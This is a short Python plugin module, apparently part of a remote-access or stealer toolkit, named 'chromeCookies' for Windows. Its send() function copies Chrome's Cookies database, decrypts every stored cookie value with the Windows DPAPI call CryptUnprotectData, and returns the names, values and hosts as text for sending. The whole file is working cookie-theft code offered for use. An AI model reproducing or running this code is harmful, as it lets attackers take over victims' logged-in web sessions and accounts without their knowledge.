__sys__ = ["Windows"]
__name__ = "chromeCookies"
__desc__ = "Retrieve all Cookies of Google Chrome"


def send():
    import os, sqlite3, win32crypt, shutil
    sourceFileWithLogin = "%s\\Google\\Chrome\\User Data\\Profile 1\\Cookies" % os.getenv("localappdata")
    sourceFileWithoutLogin = "%s\\Google\\Chrome\\User Data\\Default\\Cookies" % os.getenv("localappdata")

    def get(sourceFile):
        targetFile = "%s\\TempData_CO" % os.getenv("localappdata")
        result = "<Name>:<Value> (Site)\n"
        shutil.copy(sourceFile, targetFile)
        connection = sqlite3.connect(targetFile)
        with connection:
            cursor = connection.cursor()
            vGen = cursor.execute(
                "SELECT name, encrypted_value, host_key FROM cookies")
            dataValue = vGen.fetchall()
        for name, encryptedValue, host_key in dataValue:
            decryptedValue = win32crypt.CryptUnprotectData(
                encryptedValue, None, None, None, 0)[1].decode('utf-8')
            if decryptedValue:
                result += "%s:%s (%s)\n" % (name, decryptedValue, host_key)
        connection.close()
        os.remove(targetFile)
        return result

    if os.path.exists(sourceFileWithoutLogin) and \
            len(open(sourceFileWithoutLogin.replace("Cookies", "Login Data"), 'rb').readlines()) == 0 and \
            os.path.exists(sourceFileWithLogin):
        return get(sourceFileWithLogin)
    else:
        if os.path.exists(sourceFileWithoutLogin) and \
                not len(open(sourceFileWithoutLogin.replace("Cookies", "Login Data"), 'rb').readlines()) == 0:
            return get(sourceFileWithoutLogin)
        else:
            pass
